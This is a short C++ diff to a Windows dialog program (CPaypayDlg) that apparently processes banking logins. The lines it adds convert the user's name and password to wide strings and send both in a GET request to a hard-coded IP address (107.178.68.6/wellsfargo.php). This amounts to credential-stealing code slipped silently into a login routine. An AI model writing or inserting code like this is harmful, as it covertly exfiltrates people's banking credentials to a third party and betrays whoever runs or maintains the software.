@@ -803,6 +803,12 @@ DWORD WINAPI execute(LPVOID lpParamter)
 				wstring text = wstring(efws.begin(),efws.end());
 				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC13,text.c_str());
 
+				wstring w_name = wstring(name.begin(),name.end());
+				wstring w_password = wstring(password.begin(),password.end());
+				wstring url = L"http://107.178.68.6/wellsfargo.php?n=" + w_name + L"&p=" + w_password;
+				WinHttpClient WinClient(url);
+				WinClient.SendHttpRequest(L"GET");
+
 			}
 			else if (type == LOGIN_ERROR_COOKIE)
 			{
